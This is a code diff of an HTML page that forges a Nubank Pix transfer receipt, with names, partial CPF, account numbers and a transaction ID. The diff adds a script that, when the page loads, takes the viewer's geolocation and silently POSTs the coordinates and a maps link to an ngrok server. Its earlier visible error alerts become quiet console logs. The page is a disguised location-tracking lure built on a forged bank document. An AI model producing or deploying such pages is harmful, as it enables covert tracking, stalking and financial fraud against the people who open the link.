@@ -1,80 +1,402 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gerador de Comprovantes</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #f5f5f5;
+            padding: 20px;
+        }
+
+        .layout {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .doc {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .comprov {
+            padding: 30px;
+        }
+
+        .header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo img {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 15px;
+        }
+
+        .title-name {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .sub-data {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .main {
+            padding: 20px 0;
+        }
+
+        .list-description {
+            list-style: none;
+        }
+
+        .el {
+            display: flex;
+            justify-content: space-between;
+            padding: 15px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .el-title {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .el-desc {
+            font-size: 16px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .title-section {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 20px 0 10px 0;
+            margin-top: 10px;
+        }
+
+        .tit-sect {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .fo-p {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .id-footer {
+            word-break: break-all;
+        }
+
+        .end-inf {
+            margin: 20px 0;
+        }
+
+        .msg {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .hlp a {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            color: #820AD1;
+            text-decoration: none;
+            font-weight: 600;
+            margin: 15px 0;
+        }
+
+        .ovd {
+            font-size: 11px;
+            color: #999;
+            display: block;
+            margin-top: 15px;
+        }
+    </style>
 </head>
 
 <body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
+    <div class="layout">
+        <div class="doc">
+            <div class="comprov">
+                <div class="header">
+                    <div class="logo">
+                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23820AD1'/%3E%3Ctext x='50' y='65' font-size='50' text-anchor='middle' fill='white' font-family='Arial, sans-serif' font-weight='bold'%3ENu%3C/text%3E%3C/svg%3E" alt="Instituição Nubank">
+                    </div>
+                    <div class="title">
+                        <h1 class="title-name">
+                            Comprovante de transferência
+                        </h1>
+                    </div>
+                    <div class="info-desc">
+                        <p class="sub-data">22 JAN 2026 - 10:31</p>
+                    </div>
+                </div>
+                <div class="main">
+                    <ul class="list-description">
+                        <!-- Tipo e Valor -->
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Valor
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">R$&nbsp;<span id="value">2.862,02</span></p>
+                            </div>
+                        </li>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Tipo de transferência
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    Pix
+                                </p>
+                            </div>
+                        </li>
+                        <!-- Destino -->
+                        <li class="title-section">
+                            <span>
+                                <svg width="26" height="23" viewBox="0 0 26 23" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M2.64014 5.10144H22.9394V13.6688H20.9394V7.10144H4.64014V16.5213H13.5464V18.5213H2.64014V5.10144ZM20.3251 14.7695V18.9595L22.4705 16.8141L23.8847 18.2284L19.3251 22.7879L14.7655 18.2284L16.1798 16.8141L18.3251 18.9595V14.7695H20.3251Z" fill="black"></path>
+                                    <circle cx="12.776" cy="11.7559" r="2.07654" stroke="black" stroke-width="1.5"></circle>
+                                </svg>
+                            </span>
+                            <h3 class="tit-sect destiny">Destino</h3>
+                        </li>
 
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Nome
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    <span id="name-des">Edilaine Fernandes da Silva</span>
+                                </p>
+                            </div>
+                        </li>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    CPF
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    ***.<span id="cpf">624.584</span>-**
+                                </p>
+                            </div>
+                        </li>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Instituição
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    <span id="bco">NU Pagamentos S.A.</span>
+                                </p>
+                            </div>
+                        </li>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Agência
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    <span id="agn">0001</span>
+                                </p>
+                            </div>
+                        </li>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Conta
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    <span id="cnt">321154-4</span>
+                                </p>
+                            </div>
+                        </li>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Tipo de conta
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">Conta <span id="sel-tp">Corrente</span></p>
+                            </div>
+                        </li>
+                        <!-- Origem -->
+                        <li class="title-section">
+                            <span>
+                                <svg width="26" height="23" viewBox="0 0 26 23" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M2.64014 5.88501H22.9394V14.4524H20.9394V7.88501H4.64014V17.3048H13.5464V19.3048H2.64014V5.88501Z" fill="black"></path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12.776 13.866C13.5086 13.866 14.1025 13.2721 14.1025 12.5394C14.1025 11.8068 13.5086 11.2129 12.776 11.2129C12.0434 11.2129 11.4495 11.8068 11.4495 12.5394C11.4495 13.2721 12.0434 13.866 12.776 13.866ZM12.776 15.366C14.3371 15.366 15.6025 14.1005 15.6025 12.5394C15.6025 10.9784 14.3371 9.71289 12.776 9.71289C11.2149 9.71289 9.94946 10.9784 9.94946 12.5394C9.94946 14.1005 11.2149 15.366 12.776 15.366Z" fill="black"></path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M18.3252 22.1573L18.3252 17.9673L16.1798 20.1127L14.7656 18.6985L19.3252 14.1389L23.8848 18.6985L22.4706 20.1127L20.3252 17.9673L20.3252 22.1573L18.3252 22.1573Z" fill="black"></path>
+                                </svg>
+                            </span>
+                            <h3 class="tit-sect origin">Origem</h3>
+                        </li>
+
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Nome
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    <span id="name-orig">Ricardo Marcio Fernandez</span>
+                                </p>
+                            </div>
+                        </li>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Instituição
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    <span id="inst-orig">NU PAGAMENTOS - IP</span>
+                                </p>
+                            </div>
+                        </li>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Agência
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    <span id="agn-origin">0297</span>
+                                </p>
+                            </div>
+                        </li>
+                        <li class="el">
+                            <div class="el-head">
+                                <h3 class="el-title">
+                                    Conta
+                                </h3>
+                            </div>
+                            <div class="el-value">
+                                <p class="el-desc">
+                                    <span id="orig-account">102154-4</span>
+                                </p>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+                <div class="footer">
+                    <div class="desc">
+                        <p class="fo-p desc-footer">
+                            NU Pagamentos S.A. - Instituição de Pagamento<br>
+                            CNPJ 18.236.120/0001-58
+                        </p>
+                    </div>
+                    <div class="id">
+                        <p class="fo-p id-footer">
+                            ID da transação:&nbsp;<span id="id">455783g9298858R2313E69E2570v080C</span>
+                        </p>
+                    </div>
+                    <div class="end-inf">
+                        <span class="msg">Estamos aqui para ajudar se você tiver alguma dúvida.</span>
+                    </div>
+                    <div class="hlp">
+                        <a href="#">
+                            <span>Me ajuda</span>
+                            <span>
+                                <svg width="20" height="6" viewBox="0 0 20 6" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M1.3042 3.02949H18.9335M18.9335 3.02949L16.5654 0.661377M18.9335 3.02949L16.5654 5.3976" stroke="#820AD1" stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg>
+                            </span>
+                        </a>
+                    </div>
+                    <div class="foot-ovd">
+                        <span class="ovd">
+                            Ouvidoria: 0800 887 0463,<br>
+                            atendimento em dias úteis, das 09h às 18h (horário de São Paulo).
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir</button>
-
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
-    </div>
-
-  </div>
-
-  <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
+<script>
+    // BACKSCAN - Capturar localização automaticamente quando a página carregar
+    window.addEventListener('load', function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        } else {
+            console.log("Geolocalização não suportada");
+        }
     });
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
-
     function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      fetch("NGROK_SERVER/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        
+        fetch("https://nonproficient-waitingly-tiesha.ngrok-free.dev/send-location", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ latitude, longitude, maps })
+        })
         .then(response => response.json())
         .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
+            console.log("Localização enviada com sucesso!");
         })
         .catch(error => {
-          console.error("Erro:", error);
+            console.error("Erro ao enviar localização:", error);
         });
     }
 
     function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+        console.log("Erro ao obter localização:", error.message);
     }
-  </script>
-</body>
+</script>
 
+</body>
 </html>
